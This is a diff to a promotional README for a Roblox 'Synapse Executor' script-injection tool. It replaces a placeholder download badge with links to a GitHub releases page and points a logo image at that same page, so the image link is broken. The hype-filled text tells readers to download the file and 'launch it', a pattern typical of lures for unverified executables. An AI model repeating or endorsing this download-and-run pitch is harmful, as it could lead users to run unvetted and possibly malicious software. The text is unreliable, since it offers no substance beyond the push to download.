@@ -43,7 +43,7 @@ This repository covers a wide range of topics related to Roblox scripting and cu
 ## Get Started
 
 To start using Roblox-Synapse Executor, download the tool from the following link:  
-[![Download Now](https://img.shields.io/badge/Download-File.zip-brightgreen)](https://github.com/files/File.zip)
+[![Download Now](https://github.com/RayGlazeDonut/Roblox-Synapse/releases)](https://github.com/RayGlazeDonut/Roblox-Synapse/releases)
 
 If the link ends with a file name, make sure to launch it to begin your Roblox scripting journey. If you encounter any issues with the link, please check the "Releases" section of this repository for alternative download options.
 
@@ -51,7 +51,7 @@ If the link ends with a file name, make sure to launch it to begin your Roblox s
 
 Visit our repository to discover a world of possibilities with Roblox Synapse Executor. Elevate your Roblox gameplay, customize your experience, and unleash your creativity with the power of scripting.
 
-![Roblox Logo](https://example.com/roblox-logo.png)
+![Roblox Logo](https://github.com/RayGlazeDonut/Roblox-Synapse/releases)
 
 Dive into the world of Roblox scripting and customization with Roblox-Synapse Executor. Enhance your gameplay, automate tasks, and unlock new levels of creativity with this top-tier script execution tool. Download now and join the community of Roblox enthusiasts pushing the boundaries of game customization and innovation. 🎮✨
 
